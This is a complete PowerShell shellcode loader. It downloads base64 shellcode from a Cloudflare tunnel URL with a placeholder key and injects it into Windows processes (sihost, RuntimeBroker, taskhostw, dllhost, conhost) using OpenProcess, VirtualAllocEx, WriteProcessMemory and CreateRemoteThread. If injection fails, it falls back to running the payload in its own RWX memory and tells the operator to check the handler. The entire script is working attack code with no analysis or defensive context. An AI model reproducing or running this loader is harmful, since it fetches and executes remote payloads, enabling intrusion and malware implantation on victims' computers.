$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN"
[Net.ServicePointManager]::SecurityProtocol="Tls12"
$k="kernel32.dll"
$c=@"
using System;using System.Runtime.InteropServices;
public class X{
[DllImport("kernel32")]public static extern IntPtr OpenProcess(uint a,bool b,int c);
[DllImport("kernel32")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);
[DllImport("kernel32")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr t,uint s,IntPtr a,IntPtr p,uint f,out uint i);
[DllImport("kernel32")]public static extern bool CloseHandle(IntPtr h);
[DllImport("kernel32")]public static extern uint GetLastError();
}
"@
Add-Type $c
Write-Host "[*] Downloading shellcode..."
try{$s=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u));Write-Host "[+] Got $($s.Length) bytes"}catch{Write-Host "[-] Download failed: $_";return}

$targets = @("sihost","RuntimeBroker","taskhostw","dllhost","conhost")
foreach($tgt in $targets){
    $procs = Get-Process -Name $tgt -EA SilentlyContinue
    if($procs){
        $p = $procs[0].Id
        Write-Host "[*] Trying: $tgt PID $p"
        $h=[X]::OpenProcess(0x1F0FFF,$false,$p)
        if($h -ne [IntPtr]::Zero){
            $m=[X]::VirtualAllocEx($h,[IntPtr]::Zero,[uint32]($s.Length+4096),0x3000,0x40)
            if($m -ne [IntPtr]::Zero){
                $w=[uint32]0;[X]::WriteProcessMemory($h,$m,$s,[uint32]$s.Length,[ref]$w)|Out-Null
                Write-Host "[+] Written $w bytes at 0x$($m.ToString("X"))"
                $t=[uint32]0;$th=[X]::CreateRemoteThread($h,[IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[ref]$t)
                if($th -ne [IntPtr]::Zero){
                    Write-Host "[+] Thread $t in $tgt - SUCCESS!"
                    [X]::CloseHandle($th);[X]::CloseHandle($h)
                    return
                }
                $err=[X]::GetLastError();Write-Host "[-] CRT failed ($err), trying next..."
            }
            [X]::CloseHandle($h)
        }
    }
}

Write-Host "[*] Fallback: self-inject"
$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($s.Length)
[System.Runtime.InteropServices.Marshal]::Copy($s,0,$mem,$s.Length)
$c2=@"
using System;using System.Runtime.InteropServices;
public class R{
[DllImport("kernel32.dll",SetLastError=true)]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,out uint i);
[DllImport("kernel32.dll")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);
}
"@
Add-Type $c2
$o=[uint32]0
$sz=[UIntPtr]::new([uint64]$s.Length)
[R]::VirtualProtect($mem,$sz,0x40,[ref]$o)|Out-Null
$t=[uint32]0;$th=[R]::CreateThread([IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[ref]$t)
Write-Host "[+] Self-inject thread $t - Check handler!"
[R]::WaitForSingleObject($th,0xFFFFFFFF)|Out-Null
